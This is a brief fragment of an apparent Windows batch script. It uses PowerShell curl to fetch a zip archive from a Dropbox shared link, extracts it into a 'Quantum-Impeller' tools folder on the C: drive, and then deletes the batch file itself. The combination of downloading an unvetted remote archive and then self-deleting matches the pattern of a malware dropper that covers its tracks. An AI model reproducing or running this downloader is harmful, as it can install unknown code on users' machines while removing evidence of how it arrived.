...
powershell -Command "curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/gtlcfndl5i1qfx57wj7vc/AMVC0KXCiyi9m-h_S2eXAzA?rlkey=4pffij1swvcbmck4vn1xe8fr2&st=tg55mia6&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools\Advanced_tools"
(goto) 2>nul & del "%~f0"
